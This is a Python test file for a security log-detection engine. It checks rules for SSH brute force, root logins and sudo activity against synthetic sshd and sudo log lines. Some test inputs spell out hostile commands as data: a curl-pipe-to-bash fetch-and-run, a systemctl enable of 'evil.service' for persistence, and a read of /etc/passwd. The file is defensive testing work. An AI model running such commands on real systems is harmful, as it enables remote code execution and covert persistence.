import pytest

from alpha_sentinel.engine import Engine
from alpha_sentinel.normalize import normalize_linux_event
from alpha_sentinel.rules import evaluate_event

HOST = "web01"


def feed(engine, *lines):
    out = []
    for line in lines:
        event = normalize_linux_event(line)
        assert event is not None, line
        out.append(evaluate_event(engine, event))
    return out


def fail(n, ip="203.0.113.5", user="root", minute=0):
    return f"Oct 29 10:{minute:02d}:{n:02d} {HOST} sshd[1]: Failed password for {user} from {ip} port 22 ssh2"


def test_normalizer_handles_invalid_user_ipv6_and_iso_timestamps():
    e = normalize_linux_event(fail(1, user="invalid user admin"))
    assert (e.accountName, e.sourceIp, e.hostname, e.osFamily) == ("admin", "203.0.113.5", HOST, "linux")
    e = normalize_linux_event(f"2026-10-29T18:32:01+03:00 {HOST} sshd[1]: Accepted publickey for deploy from 2001:db8::1 port 22 ssh2")
    assert (e.accountName, e.sourceIp, e.hostname) == ("deploy", "2001:db8::1", HOST)
    assert e.timestamp.startswith("2026-10-29T18:32:01")
    assert "publickey" in e.command


def test_ssh_bruteforce_fires_at_five_and_dedupes():
    eng = Engine()
    results = feed(eng, *[fail(i) for i in range(1, 8)])
    assert [r.RuleKey for r in results if r] == ["ssh_bruteforce"]
    assert results[4] is not None and results[5] is None


def test_windows_rules_do_not_see_linux_events():
    eng = Engine()
    feed(eng, *[fail(i, user=f"user{i}") for i in range(1, 12)])
    assert all(a.RuleKey.startswith("ssh_") for a in eng.alerts)  # no password_spraying etc.


def test_success_after_failures_requires_recent_failures():
    eng = Engine()
    feed(eng, fail(1), fail(2), fail(3))
    ok = "Oct 29 10:05:00 web01 sshd[1]: Accepted password for alice from 203.0.113.5 port 22 ssh2"
    assert feed(eng, ok)[0].RuleKey == "ssh_success_after_failures"
    eng2 = Engine()
    feed(eng2, fail(1), fail(2), fail(3))
    late = "Oct 29 12:00:00 web01 sshd[1]: Accepted password for alice from 203.0.113.5 port 22 ssh2"
    assert feed(eng2, late)[0] is None  # 2 hours later: failures are stale


def test_root_login_and_key_auth():
    eng = Engine()
    r = feed(eng, "Oct 29 10:00:00 web01 sshd[1]: Accepted publickey for root from 198.51.100.7 port 22 ssh2")
    assert r[0].RuleKey == "root_ssh_login"
    r = feed(Engine(), "Oct 29 10:00:00 web01 sshd[1]: Accepted publickey for deploy from 198.51.100.7 port 22 ssh2")
    assert r[0].RuleKey == "ssh_key_auth"


def sudo(cmd, user="alice"):
    return f"Oct 29 10:00:00 {HOST} sudo:   {user} : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND={cmd}"


@pytest.mark.parametrize("cmd,rule", [
    ("/usr/sbin/useradd bob", "user_account_changed"),
    ("/usr/bin/crontab -e", "cron_or_systemd_persistence"),
    ("/usr/bin/systemctl enable evil.service", "cron_or_systemd_persistence"),
    ("/usr/bin/curl http://x/y.sh | bash", "suspicious_command_execution"),
    ("/bin/ls /root", "sudo_privilege_escalation"),
])
def test_sudo_commands(cmd, rule):
    assert feed(Engine(), sudo(cmd))[0].RuleKey == rule


@pytest.mark.parametrize("cmd", ["/usr/bin/cat /etc/passwd", "/usr/bin/crontab -l", "/usr/bin/systemctl status ssh"])
def test_benign_commands_do_not_trigger_account_or_persistence_rules(cmd):
    r = feed(Engine(), sudo(cmd))[0]
    assert r is None or r.RuleKey == "sudo_privilege_escalation"


def test_ssh_dash_c_is_not_flagged_as_sh_dash_c():
    r = feed(Engine(), sudo("/usr/bin/ssh -c aes256-ctr host"))[0]
    assert r is None or r.RuleKey != "suspicious_command_execution"


def test_sudo_dedupe_actually_dedupes():
    eng = Engine()
    feed(eng, sudo("/bin/ls /root"), sudo("/bin/ls /root"), sudo("/bin/ls /root"))
    assert len(eng.alerts) == 1
